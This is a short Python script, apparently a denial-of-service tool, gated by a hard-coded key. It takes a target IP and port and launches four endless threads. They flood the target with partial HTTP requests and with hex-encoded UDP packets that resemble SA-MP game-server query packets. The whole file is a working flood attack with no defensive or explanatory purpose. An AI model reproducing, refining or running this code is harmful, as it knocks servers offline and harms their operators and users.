import socket
import struct
import codecs,sys
import threading
import random
import time
import os

password = input("Enter Key: ")

if password == "FreeDos":
    print("\033[32mAccess granted")
else:
    print("\033[31mAccess denied")
    sys.exit(1)

ip = input("IP Target : ")
port = input("Port       : ")

orgip =ip

xnxx = [
    codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
    codecs.decode("53414d509538e1a9611e63","hex_codec"),#c
    codecs.decode("53414d509538e1a9611e69","hex_codec"),#i
    codecs.decode("53414d509538e1a9611e72","hex_codec"),#r
    codecs.decode("081e62da","hex_codec"), #cookie port 7796
    codecs.decode("081e77da","hex_codec"),#cookie port 7777
    codecs.decode("081e4dda","hex_codec"),#cookie port 7771
    codecs.decode("021efd40","hex_codec"),#cookie port 7784
    codecs.decode("081e7eda","hex_codec")#cookie port 7784 tambem
]

print("ATTACKING IP : %s Port %s"%(orgip,port))

class Layer1(threading.Thread):
    def run(self):
        while True:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((ip, int(port)))
                sock.send(bytes("GET / HTTP/1.1\r\n", "utf-8"))
                sock.send(bytes("Host: " + ip + "\r\n", "utf-8"))
                sock.send(bytes("Connection: keep-alive\r\n", "utf-8"))
                sock.send(bytes("Keep-Alive: timeout=5, max=1000\r\n", "utf-8"))
                sock.send(bytes("Referrer: http://www.google.com?q=" + ip + "\r\n", "utf-8"))
            except:
                pass

class Layer2(threading.Thread):
    def run(self):
        while True:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(xnxx[random.randrange(0,3)], (ip, int(port)))
            except:
                pass

class Layer3(threading.Thread):
    def run(self):
        while True:
            try:
                for cookie in [4, 5, 6, 7]:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.sendto(xnxx[cookie], (ip, int(port)))
            except:
                pass

class Layer4(threading.Thread):
    def run(self):
        while True:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((ip, int(port)))
                packet = str("GET /" + "A"*random.randint(0, 1024) + " HTTP/1.1\r\n").encode("utf-8")
                sock.send(packet)
            except:
                pass

if __name__ == '__main__':
    try:
        layer1 = Layer1()
        layer1.start()
        layer2 = Layer2()
        layer2.start()
        layer3 = Layer3()
        layer3.start()
        layer4 = Layer4()
        layer4.start()
    except(KeyboardInterrupt):
        os.system('cls' if os.name == 'nt'else'clear')
        sys.exit(1)
